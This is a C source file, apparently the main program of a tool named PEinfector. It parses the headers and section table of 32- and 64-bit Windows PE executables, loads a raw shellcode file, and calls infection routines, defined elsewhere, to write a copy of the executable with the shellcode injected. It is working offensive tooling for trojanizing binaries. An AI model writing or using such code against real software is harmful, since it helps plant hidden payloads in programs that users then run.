#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>

#include "PEinfector.h"




#define MAX_FILE_PATH 512


static char file_path[MAX_FILE_PATH] = "";
static char shellcode_file_path[MAX_FILE_PATH] = "";
static char output_file_path[MAX_FILE_PATH] = "";
static int show_sections_flag = 0;

static void ParseOptions(int argc, char** argv);
static void PrintHelp(char* prog_name);


int main(int argc, char** argv) {
	pe_dos_header dosHeader;
	FILE* f = NULL;
	ach_mode mode = MODE_32BIT;
	
	ParseOptions(argc, argv);
	
	if (!strlen(file_path) || 
		!strlen(shellcode_file_path) || 
		!strlen(output_file_path)) {
		fprintf(stderr, "Missing required options!\n");
		PrintHelp(argv[0]);
	}
	
	f = fopen(file_path, "rb");
	
	if (!f) {
		fprintf(stderr, "Can't open file %s\n", file_path);
		return -1;
	}
	
	//read dos header
	if (fread(&dosHeader, sizeof(pe_dos_header), 1, f) == 0) {
		fprintf(stderr, "File %s too small (DOS header)\n", file_path);
		fclose(f);
		return -2;
	}
	
	rewind(f);
	
	fprintf(stdout, "nt header offset is 0x%X\n", dosHeader.e_lfanew);
	
	//read nt header
	pe_nt_header ntHeader;
	pe64_nt_header ntHeader64;
	
	if (fseek(f, dosHeader.e_lfanew, SEEK_SET) < 0) {
		fprintf(stderr, "File %s doesn't have nt header\n", file_path);
		fclose(f);
		return -3;
	}
	
	if (fread(&ntHeader, sizeof(pe_nt_header), 1, f) == 0) {
		fprintf(stderr, "File %s too small (NT header)\n", file_path);
		fclose(f);
		return -4;
	}
	
	if (ntHeader.nt_optional_header.magic == IMAGE_NT_OPTIONAL_64_MAGIC) {
		//it is 64bit binary
		mode = MODE_64BIT;
		
		//reparse to another header
		fseek(f, dosHeader.e_lfanew, SEEK_SET);
		
		if (fread(&ntHeader64, sizeof(pe64_nt_header), 1, f) == 0) {
			fprintf(stderr, "File %s too small (NT64 header)\n", file_path);
			fclose(f);
			return -4;
		}
	}
	
	uint16_t sections_table_offset = 0;
	
	switch (mode) {
		case MODE_32BIT:
			fprintf(stdout, "That binary has 32bit arch\n");
			fprintf(stdout, "EntryPoint: 0x%08X\n", ntHeader.nt_optional_header.address_of_entry_point);
			fprintf(stdout, "ImageBase: 0x%08X\n", ntHeader.nt_optional_header.image_base);
			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader.nt_optional_header.file_alignment);
			
			sections_table_offset = dosHeader.e_lfanew + ntHeader.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t);
			break;
		case MODE_64BIT:
			fprintf(stdout, "That binary has 64bit arch\n");
			fprintf(stdout, "EntryPoint: 0x%08X\n", ntHeader64.nt_optional_header.address_of_entry_point);
			fprintf(stdout, "ImageBase: 0x%016lX\n", ntHeader64.nt_optional_header.image_base);
			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader64.nt_optional_header.file_alignment);
			
			sections_table_offset = dosHeader.e_lfanew + ntHeader64.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t);
			break;
	}
	
	//parse table of section
	rewind(f);
	
	if (fseek(f, sections_table_offset, SEEK_SET) < 0) {
		fprintf(stderr, "File %s doesn't have section table\n", file_path);
		fclose(f);
		return -5;
	}
	
	if (show_sections_flag) {
		switch (mode) {
			case MODE_32BIT:
				for (uint16_t i = 0; i < ntHeader.nt_file_header.number_of_sections; i++) {
					pe_section_header sectionHeader;
					
					if (fread(&sectionHeader, sizeof(pe_section_header), 1, f) == 0) {
						fprintf(stderr, "File %s too small (Can't read section number %d)\n", file_path, i);
						fclose(f);
						return -6;
					}
					
					pe_print_section_header(&sectionHeader);
					fprintf(stdout, "\n");
				}
				
				break;
			case MODE_64BIT:
				for (uint16_t i = 0; i < ntHeader64.nt_file_header.number_of_sections; i++) {
					pe_section_header sectionHeader;
					
					if (fread(&sectionHeader, sizeof(pe_section_header), 1, f) == 0) {
						fprintf(stderr, "File %s too small (Can't read section number %d)\n", file_path, i);
						fclose(f);
						return -6;
					}
					
					pe_print_section_header(&sectionHeader);
					fprintf(stdout, "\n");
				}
			
				break;
		}
	}
	
	FILE* sf = fopen(shellcode_file_path, "rb");
	
	if (!sf) {
		fprintf(stderr, "Can't open shellcode file: %s\n", shellcode_file_path);
		fclose(f);
		return -7;
	}
	
	FILE* out_f = fopen(output_file_path, "wb+");
	
	if (!out_f) {
		fprintf(stderr, "Can't open file for output: %s\n", output_file_path);
		fclose(f);
		fclose(sf);
		return -8;
	}
	
	//obtain shellcode file size
	fseek(sf, 0, SEEK_END);
	uint32_t size = ftell(sf);
	rewind(sf);
	
	fprintf(stdout, "size of shellcode: %u\n", size);
	
	unsigned char* xcode = (unsigned char*)malloc(size);
	
	if (!xcode) {
		fprintf(stderr, "Can't allocate memory for shellcode\n");
		fclose(f);
		fclose(sf);
		return -9;
	}
	
	fread(xcode, size, 1, sf);
	
	int err = 0;
	switch (mode) {
		case MODE_32BIT:
			err = pe_infect_section(f, out_f, &dosHeader, &ntHeader, xcode, size);
			break;
		case MODE_64BIT:
			err = pe64_infect_section(f, out_f, &dosHeader, &ntHeader64, xcode, size);
			break;
	}
	
	if (!err) {
		fprintf(stdout, "Infection success!\n");
	} else {
		fprintf(stderr, "Infection error %d\n", err);
	}
	
	fclose(f);
	fclose(out_f);
	
	return 0;
}

static void ParseOptions(int argc, char** argv) {
	const char* short_options = "hi:o:s:d";
	
	const struct option long_options[] = {
		{ "help", no_argument, NULL, 'h' },
		{ "input", required_argument, NULL, 'i' },
		{ "output", required_argument, NULL, 'o' },
		{ "shellcode", required_argument, NULL, 's' },
		{ "info", no_argument, NULL, 'd' },
		{ NULL, 0, NULL, 0 }
	};
	
	int res;
	int option_index;
	
	while (( res = getopt_long(argc, argv, short_options, 
		long_options, &option_index)) != -1) {
		switch (res) {
			case 'h':
				//print help
				PrintHelp(argv[0]);
				break;
			case 'i':
				strncpy(file_path, optarg, MAX_FILE_PATH);
				break;
			case 'o':
				strncpy(output_file_path, optarg, MAX_FILE_PATH);
				break;
			case 's':
				strncpy(shellcode_file_path, optarg, MAX_FILE_PATH);
				break;
			case 'd':
				show_sections_flag = 1;
				break;
			default:
				PrintHelp(argv[0]);
				break;
		};
	};
}

static void PrintHelp(char* prog_name) {
	fprintf(stdout, "Usage: %s -i <input_file> -o <output_file> -s <raw_shellcode_file>\n", prog_name);
	fprintf(stdout, "\t -d - show section info\n");
	fprintf(stdout, "Long options usage: %s --input <input_file> --output <output_file> --shellcode <raw_shellcode_file>\n", prog_name);
	fprintf(stdout, "\t --info - show section info\n");
	exit(-99);
}
